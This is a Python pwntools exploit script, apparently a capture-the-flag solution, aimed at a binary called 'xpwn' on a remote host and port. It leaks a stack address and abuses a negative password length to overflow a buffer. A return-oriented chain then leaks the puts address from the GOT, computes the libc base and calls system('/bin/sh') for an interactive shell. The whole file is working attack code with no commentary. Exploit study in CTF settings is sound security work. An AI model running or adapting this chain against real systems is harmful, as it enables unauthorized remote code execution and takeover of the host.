from pwn import *

context.log_level='DEBUG'

#p=process('./xpwn')
p = remote('116.85.48.105','5005')
elf=ELF('./xpwn')
libc=ELF('./libc.so.6')

start=0x080484E0
main=0x08048669
p.sendafter('Enter username: ','a'*40)
p.recvuntil('a'*40)
stack_ebp=u32(p.recv(4))
success("ebp:"+hex(stack_ebp))

p.sendafter('Please set the length of password: ','-1')
payload1='a'*68+p32(stack_ebp+8)+'b'*4+p32(stack_ebp)+p32(elf.plt['puts'])+p32(main)+p32(elf.got['puts'])
p.sendafter('):',payload1)
#print p.recv()
p.recvuntil('All done, bye!\n')
puts_got=u32(p.recv(4))
success('puts_got:'+hex(puts_got))
libc.address=puts_got-libc.sym['puts']
sys=libc.sym['system']
binsh=libc.search('/bin/sh').next()

payload2='a'*68+p32(stack_ebp+8)+'b'*4+p32(stack_ebp)+p32(sys)+'b'*4+p32(binsh)
p.sendafter('Enter username: ','a')
p.sendafter('Please set the length of password: ','-1')
p.sendafter('):',payload2)

p.interactive()